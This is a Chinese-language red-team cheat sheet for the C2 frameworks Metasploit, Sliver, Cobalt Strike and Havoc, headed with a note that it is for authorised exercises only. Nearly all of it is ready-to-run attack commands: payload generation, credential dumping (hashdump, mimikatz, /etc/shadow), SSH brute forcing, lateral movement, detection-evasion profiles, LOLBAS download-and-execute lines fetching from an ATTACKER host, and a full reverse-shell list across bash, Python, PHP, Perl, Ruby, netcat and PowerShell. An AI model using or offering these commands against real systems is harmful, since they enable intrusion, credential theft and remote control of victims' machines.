# C2框架指南

> @TGSEC社区 · @TGSEC-Qtzuu 整理
> 仅用于授权红队演练

## 一、Metasploit

### 基础使用
```bash
# 生成Payload
# Linux反弹shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe
# PHP Webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.php
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.jsp
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.py

# 监听
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j

# Meterpreter后渗透
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> upload /tmp/tool.sh /tmp/
meterpreter> download /etc/shadow /tmp/
meterpreter> shell  # 进入系统shell
meterpreter> portfwd add -l 3306 -p 3306 -r 192.168.1.100  # 端口转发
meterpreter> route add 192.168.1.0/24 1  # 添加路由
meterpreter> run autoroute -s 192.168.1.0/24
meterpreter> bg  # 后台运行
```

### 常用模块
```bash
# 内网扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,445,3306,6379,8080
run

# SMB扫描
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# SSH爆破
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## 二、Sliver

### 安装
```bash
curl https://sliver.sh/install | sudo bash
# 或
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && ./sliver-server_linux
```

### 使用
```bash
sliver > generate --mtls ATTACKER --os linux --arch amd64 --save /tmp/implant
sliver > mtls --lport 8443  # 启动监听

# Implant上线后
sliver (IMPLANT) > info
sliver (IMPLANT) > ifconfig
sliver (IMPLANT) > netstat
sliver (IMPLANT) > upload /tmp/tool /tmp/tool
sliver (IMPLANT) > download /etc/shadow /tmp/
sliver (IMPLANT) > shell  # 交互shell
sliver (IMPLANT) > socks5 start  # SOCKS5代理
sliver (IMPLANT) > portfwd add -b 127.0.0.1:3306 -r 192.168.1.100:3306
```

## 三、Cobalt Strike

### 基础配置
```bash
# 启动Team Server
./teamserver ATTACKER_IP password

# 客户端连接
./cobaltstrike  # 填入IP:50050 + 密码

# 创建Listener
Cobalt Strike → Listeners → Add
  Name: https-listener
  Payload: Beacon HTTPS
  HTTPS Hosts: ATTACKER_IP
  HTTPS Port: 443

# 生成Payload
Attacks → Packages → Windows Executable (Stageless)
Attacks → Web Drive-by → Scripted Web Delivery
```

### Beacon操作
```bash
beacon> sleep 10 30    # 心跳10秒,抖动30%
beacon> shell whoami
beacon> execute-assembly /path/to/sharp_tool.exe
beacon> powershell-import /path/to/script.ps1
beacon> hashdump
beacon> logonpasswords  # mimikatz
beacon> portscan 192.168.1.0/24 22,80,445,3389 arp 1024
beacon> socks 1080      # SOCKS代理
beacon> rportfwd 8080 192.168.1.100 80  # 反向端口转发
beacon> jump psexec 192.168.1.100 smb-listener  # 横移
beacon> spawn x64 https-listener  # 派生新session
```

### Malleable C2 Profile
```
# 自定义流量特征,绕过检测
set sleeptime "30000";
set jitter "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/updates";
    client { header "Accept" "application/json"; }
    server { header "Content-Type" "application/json"; output { base64; } }
}
```

## 四、Havoc

```bash
# 安装
git clone https://github.com/HavocFramework/Havoc
cd Havoc && make

# 启动
./havoc server --profile profiles/havoc.yaotl
./havoc client  # GUI客户端

# 生成Agent(Demon)
# Listeners → 新建 HTTPS Listener
# Payloads → 生成 Demon EXE/DLL/Shellcode
```

## 五、免杀基础

### 编码/加密
```bash
# msfvenom编码
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x64/xor -i 5 -f exe

# 自定义加密loader
# AES加密shellcode → 内存解密 → 执行
# 工具: ScareCrow, Nimcrypt2, Freeze
```

### 白名单利用(LOLBAS)
```bash
# certutil下载
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\temp\p.exe

# mshta执行
mshta http://ATTACKER/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll

# rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")
```

## 六、反弹Shell速查

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh ATTACKER 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"

# 接收端
nc -lvnp 4444
# 升级交互式shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
